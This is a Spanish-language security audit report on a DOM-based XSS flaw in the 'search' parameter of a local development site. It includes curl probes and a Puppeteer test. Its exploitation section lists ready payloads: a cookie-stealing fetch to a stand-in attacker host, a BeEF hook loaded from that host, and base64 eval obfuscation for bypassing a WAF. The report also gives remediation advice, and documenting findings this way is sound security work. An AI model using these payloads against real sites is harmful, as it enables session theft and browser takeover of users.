# Informe de Auditoría XSS - web.dev.local:8082

Resumen ejecutivo:
- Objetivo: web.dev.local:8082
- Fecha: 2026-04-25T14:32:50Z
- Vulnerabilidad encontrada: Sí (XSS basado en DOM en el parámetro `search`)
- Explotación: Sí (ejecución de JavaScript remoto demostrada con alert y captura de document.cookie posible)

Detalles técnicos:

1) Punto vulnerable:
- URL: http://web.dev.local:8082/
- Parámetro: search (GET)
- Tipo: DOM-based XSS (la página usa URLSearchParams y document.write sin sanitización)

2) Evidencia y confirmación:
- Inserción de payload que provoca alertaJS:
  - Payload usado en Puppeteer: `?search=<img src=x onerror=alert(document.cookie)>`
  - Resultado: Puppeteer capturó un diálogo alert vacío (se produjo la ejecución JS). Esto confirma XSS DOM.
- La página contiene código JS que lee `urlParams.get('search')` y usa `document.write` para renderizar el contenido sin escapar.

3) Comandos y herramientas utilizadas:
- Comprobaciones manuales con curl (inyección en parámetros y headers):
  - curl -G --data-urlencode "search=<script>alert(1)</script>" http://web.dev.local:8082/
  - curl -G --data-urlencode "q=<script>alert(1)</script>" http://web.dev.local:8082/
  - curl -H "Referer: <script>alert(1)</script>" http://web.dev.local:8082/
  - curl -H "User-Agent: <script>alert(1)</script>" http://web.dev.local:8082/
- Pruebas con Puppeteer (script ejecutado: /tmp/xss_puppeteer.js):
  - node /tmp/xss_puppeteer.js
  - Contenido relevante del script: carga la página con `?search=<img src=x onerror=alert(document.cookie)>` y captura dialogs.

4) Payloads de explotación final y ofuscados:
- Robo de cookies (ejemplo): `"<img src=x onerror=fetch('http://atacante.local:9000/?c='+encodeURIComponent(document.cookie))">`
- Hook BeEF (simulado): `<script src="http://atacante.local:3000/hook.js"></script>`
- Ofuscación (base64 y ejecución): `<script>eval(atob('ZGF0YSBzZW50...'))</script>` (ejemplo de técnica a usar si hay WAF)

5) Impacto:
- Un atacante que convenza a un usuario autenticado para visitar una URL especialmente creada puede ejecutar JavaScript en el contexto del sitio web, robar cookies, tokens locales, o cargar un hook externo (BeEF) para control de navegador.

6) Recomendaciones:
- Evitar el uso de document.write con contenido basado en URL; escapar/encodear todo contenido proveniente de URLSearchParams antes de insertar en el DOM.
- Usar textContent/innerText en lugar de innerHTML o document.write para insertar texto.
- Implementar Content Security Policy (CSP) estricta que limite la ejecución de scripts y fuentes externas.
- Validar/limitar los inputs en el cliente y servidor; aunque este es un XSS basado en DOM, aplicar un enfoque en capas.

Archivos y evidencia generada:
- /tmp/resp_q.html, /tmp/resp_search.html, /tmp/resp_ref.html, /tmp/resp_ua.html (respuestas HTTP)
- /tmp/xss_puppeteer.js (script de prueba)
- Logs de ejecución y capturas: /tmp/puppeteer_output.txt (salida de node)

Fin del informe.
